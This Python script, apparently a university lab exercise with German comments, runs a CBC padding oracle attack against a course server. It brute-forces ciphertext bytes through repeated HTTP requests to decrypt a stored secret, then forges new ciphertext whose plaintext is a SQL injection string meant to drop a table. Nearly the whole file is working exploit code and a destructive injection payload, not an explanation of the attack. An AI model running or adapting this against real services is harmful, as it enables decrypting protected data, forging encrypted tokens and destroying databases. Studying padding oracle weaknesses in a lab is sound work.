from multiprocessing import Pool
from urllib import parse
import requests
import time
import base64

NEW_PLAIN = "'); DROP TABLE Jan;-- not the data you need....."
OLD_PLAIN = "Indeed it really works very fast and beautiful"

#TODO: parallel
def main():
    start = time.time()

    # this is the original secret
    secret = "2QicDQHnGmRuZys0M5JcwCSTeFNXvVm%2FSsG1vaEkIZU1OiGgpLJTdbRO2beA831a0xsatfOy01N38W1RidzrXA%3D%3D"

    # url-decode the secret
    url_decoded_str = parse.unquote(secret)

    # base64-decode the secret as bytes
    chiffre_bytes = base64.b64decode(url_decoded_str)
    
    # turns bytes into 16 byte sized chunks
    blocks = get_blocks(chiffre_bytes)

    new_text = bytes(NEW_PLAIN, encoding="ascii")
    new_text_blocks = get_blocks(new_text)
    
    print(blocks)
    print(new_text_blocks)
    for block in new_text_blocks:
        print(len(block))

    for block in blocks:
        print(len(block))

    result = ""
    block_list = [None] * len(blocks)
    #hier bis -1 oder 0? erster ist ja der IV glaube reicht also bis 0
    #for i in range(len(blocks)-1, 0, -1):
    #    block_list[i] = crack(blocks[i], blocks[i-1])
    #    result = block_list[i]["PB"].decode('utf-8') + result
    
    #print(result)
    #print(block_list)
    
    new_chiffre_blocks = [None] * len(blocks)
    
    new_chiffre_blocks[3] = blocks[3]
    
    new_chiffre_blocks[2] = transform(crack(blocks[3], blocks[2])["IB"], new_text_blocks[2])  

    new_chiffre_blocks[1] = transform(crack(new_chiffre_blocks[2], blocks[1])["IB"], new_text_blocks[1])

    new_chiffre_blocks[0] = transform(crack(new_chiffre_blocks[1], blocks[0])["IB"], new_text_blocks[0])

    new_result = ""
    new_block_list = [None] * len(blocks)
    for i in range(len(blocks)-1, 0, -1):
        print(i)
        new_block_list[i] = crack(new_chiffre_blocks[i], new_chiffre_blocks[i-1])
        new_result = new_block_list[i]["PB"].decode('utf-8') + new_result

    #result = crack(blocks[3], new_previous_block)
    print(new_result)

    end = time.time()
    print(f"total time: {end-start}")

#crack ist welcher gerade geknackt wird -> wir berechnen dessen IS
def crack(crack_block: bytes, chiffre_block: bytes):

    Session = requests.Session()
    changable_block = bytearray(16)
    intermediate_block = bytearray(16)    
    plain_block = bytearray(16)    
    padding = 1

    print(f"attempting crack for block: {crack_block}")

    for byte in range(15, -1, -1):
        
        #testing all the possibilities
        for i in range(0, 256):
            changable_block[byte] = i
            url = encode_to_b64_url(changable_block + crack_block)
            res = send_request(url, Session)

            if res == 200:          
                intermediate_block[byte] = changable_block[byte] ^ padding
                plain_block[byte] = chiffre_block[byte] ^ intermediate_block[byte]
                #setup next iteration       
                changable_block = configure_changable_block(padding+1, intermediate_block)
                padding+=1
                break

    return {"IB": intermediate_block, "PB": plain_block}

def transform(intermediate_block: bytes, plain_block:bytes):
    previous_block = bytearray(16)
    for byte in range(15, -1, -1):
        previous_block[byte] = intermediate_block[byte]^plain_block[byte]
    
    return previous_block


#needed for sending requests
def encode_to_b64_url(byte_arr: bytes):
    tmp = base64.b64encode(byte_arr)
    return parse.quote(tmp, safe='')

#needed for setting up next iteration in crack()
def configure_changable_block(padding: int, intermediate_block: bytearray) -> bytearray:
    changable_block = bytearray(16)

    for byte in range(15,-1,-1):
        changable_block[byte] = padding ^ intermediate_block[byte]

    return changable_block

def send_request(url: str, session: requests.Session) -> int:
    BASE_URL = "http://gruenau2.informatik.hu-berlin.de:8888/store_secret/?secret="

    return session.get(BASE_URL + url).status_code

def get_blocks(chiffre_bytes: bytes) -> list:
    blocks = []
    #old
    #for i in range(0, len(chiffre_bytes)//16):
    #    blocks.append(chiffre_bytes[i*16:i*16+16])

    #new
    for i in range(0, len(chiffre_bytes), 16):
        blocks.append(chiffre_bytes[i:i+16])
    return blocks

main()